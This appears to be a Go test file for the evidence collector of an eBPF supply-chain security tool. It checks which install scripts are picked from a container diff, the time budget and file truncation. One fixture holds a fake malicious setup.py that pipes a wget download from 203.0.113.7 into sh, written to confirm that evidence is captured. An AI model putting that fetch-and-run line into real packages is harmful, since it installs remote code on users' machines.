package evidence

import (
	"context"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/dockerapi"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/store"
)

// 증거 코드 보기(11/10 사용자 「코드를 볼 수 있게」): 격리 직전 같은 예산(Budget) 안에서 설치 스크립트만 저장한다.
// 고르는 규칙: 로컬 패키지 폴더(/pkg/<이름>)의 설치 스크립트 → diff 의 설치 스크립트(얕은 경로 먼저), 캐시 · 빌드 도구 경로 제외, 최대 MaxFiles 개.

func TestPickScripts(t *testing.T) {
	ch := []dockerapi.Change{
		{Kind: "A", Path: "/pkg"},
		{Kind: "A", Path: "/pkg/reqeusts"},
		{Kind: "A", Path: "/root/.cache/pip/http-v2/0/setup.py"}, // 캐시
		{Kind: "A", Path: "/tmp/pip-build-env-x/overlay/lib/python3.12/site-packages/setuptools/setup.py"}, // 빌드 도구
		{Kind: "A", Path: "/tmp/pip-install-ab/evil/setup.py"},
		{Kind: "A", Path: "/tmp/pip-install-ab/evil/pyproject.toml"},
		{Kind: "A", Path: "/tmp/payload.sh"},
		{Kind: "D", Path: "/tmp/gone.sh"}, // 지운 파일은 읽을 수 없다
		{Kind: "A", Path: "/work/node_modules/left-pad/package.json"},
		{Kind: "A", Path: "/work/node_modules/left-pad/node_modules/deep/package.json"}, // 의존성의 의존성
		{Kind: "A", Path: "/work/node_modules/@scope/pkg/package.json"},
		{Kind: "A", Path: "/usr/local/cargo/registry/src/index.crates.io-1/evil-0.1.0/build.rs"},
		{Kind: "A", Path: "/tmp/readme.txt"},
	}
	got := pickScripts(ch)
	want := []string{
		"/pkg/reqeusts/setup.py", "/pkg/reqeusts/pyproject.toml", "/pkg/reqeusts/package.json", "/pkg/reqeusts/build.rs",
		"/tmp/payload.sh", "/tmp/pip-install-ab/evil/setup.py",
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("pickScripts =\n%q\nwant\n%q", got, want)
	}
	// /pkg 가 없으면 diff 쪽만, 얕은 것부터
	got = pickScripts(ch[2:])
	want = []string{
		"/tmp/payload.sh", "/tmp/pip-install-ab/evil/setup.py", "/tmp/pip-install-ab/evil/pyproject.toml",
		"/work/node_modules/left-pad/package.json", "/work/node_modules/@scope/pkg/package.json",
		"/usr/local/cargo/registry/src/index.crates.io-1/evil-0.1.0/build.rs",
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("pickScripts(no /pkg) =\n%q\nwant\n%q", got, want)
	}
}

// fileFake: newFake 에 ReadFile 을 더한 것(선택 인터페이스 FileReader)
type fileFake struct {
	*fakeDocker
	files map[string]string
	mu    sync.Mutex // ReadFile 은 동시에 불린다
	read  []string
}

func (f *fileFake) ReadFile(ctx context.Context, _ string, path string, limit int64) ([]byte, int64, error) {
	if err := f.wait(ctx, "read"); err != nil {
		return nil, 0, err
	}
	f.mu.Lock()
	f.read = append(f.read, path)
	f.mu.Unlock()
	s, ok := f.files[path]
	if !ok {
		return nil, 0, dockerapi.ErrNotFound
	}
	if int64(len(s)) > limit {
		return []byte(s[:limit]), int64(len(s)), nil
	}
	return []byte(s), int64(len(s)), nil
}

func TestCollectSavesInstallScripts(t *testing.T) {
	f := &fileFake{fakeDocker: newFake(), files: map[string]string{
		"/pkg/reqeusts/setup.py": "import subprocess\nsubprocess.run('wget -q -O- http://203.0.113.7/x.sh | sh', shell=True)\n",
		"/tmp/payload.sh":        strings.Repeat("echo hi\n", FileBytes/8+10), // 상한을 넘는다
		"/tmp/blob.sh":           "ELF\x00\x01binary",                         // 글이 아니면 저장하지 않는다
	}}
	f.changes = []dockerapi.Change{{Kind: "A", Path: "/pkg/reqeusts"}, {Kind: "A", Path: "/tmp/payload.sh"}, {Kind: "A", Path: "/tmp/blob.sh"}}
	ev, err := New(f, store.NewMemory()).Collect(context.Background(), cid)
	if err != nil {
		t.Fatal(err)
	}
	if ev.Partial {
		t.Fatalf("missing files are not a partial collection: %q", ev.Error)
	}
	if len(ev.Files) != 2 {
		t.Fatalf("files = %+v", ev.Files)
	}
	byPath := map[string]int{}
	for i, x := range ev.Files {
		byPath[x.Path] = i
	}
	s := ev.Files[byPath["/pkg/reqeusts/setup.py"]]
	if !strings.Contains(s.Content, "203.0.113.7") || s.Truncated || s.Size != int64(len(s.Content)) {
		t.Fatalf("setup.py = %+v", s)
	}
	p := ev.Files[byPath["/tmp/payload.sh"]]
	if !p.Truncated || len(p.Content) != FileBytes || p.Size <= int64(FileBytes) {
		t.Fatalf("payload.sh truncated = %v len %d size %d", p.Truncated, len(p.Content), p.Size)
	}
}

// 스크립트 읽기가 늦어도 예산을 넘기지 않는다(격리 시각 그대로) — 못 읽은 것은 partial 로 남긴다
func TestCollectScriptsWithinBudget(t *testing.T) {
	f := &fileFake{fakeDocker: newFake(), files: map[string]string{"/tmp/payload.sh": "echo hi\n"}}
	f.changes = []dockerapi.Change{{Kind: "A", Path: "/tmp/payload.sh"}}
	f.delay["read"] = 5 * time.Second
	c := New(f, store.NewMemory())
	c.Budget = 150 * time.Millisecond
	start := time.Now()
	ev, err := c.Collect(context.Background(), cid)
	if err != nil {
		t.Fatal(err)
	}
	if el := time.Since(start); el > c.Budget+300*time.Millisecond {
		t.Fatalf("collect took %v, budget %v", el, c.Budget)
	}
	if !ev.Partial || !strings.Contains(ev.Error, "files") || len(ev.Files) != 0 || len(ev.Changes) != 1 {
		t.Fatalf("%+v", ev)
	}
}

// ReadFile 이 없는 Docker(옛 구현 · 시험 가짜)는 지금처럼 — 파일 없이, partial 아님
func TestCollectWithoutFileReader(t *testing.T) {
	ev, err := New(newFake(), store.NewMemory()).Collect(context.Background(), cid)
	if err != nil || ev.Partial || len(ev.Files) != 0 {
		t.Fatalf("%v %+v", err, ev)
	}
}
